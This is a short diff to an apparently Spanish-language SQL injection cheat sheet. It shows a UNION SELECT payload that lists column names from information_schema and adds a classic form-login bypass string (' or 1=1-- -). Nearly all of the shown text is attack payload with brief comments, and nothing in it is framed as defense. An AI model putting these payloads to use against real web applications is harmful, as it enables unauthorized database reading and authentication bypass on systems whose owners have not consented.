@@ -19,3 +19,9 @@ Introducir informacion una vez sabemos el numero de columnas que hay
 ' union select group_concat(column_name) from information_schema.column where table_schema='table' and table_name='table' limit 0,1-- -
 // ver columnas de la tabla
 ```
+
+Validar en un formulario
+
+```
+' or 1=1-- -
+```
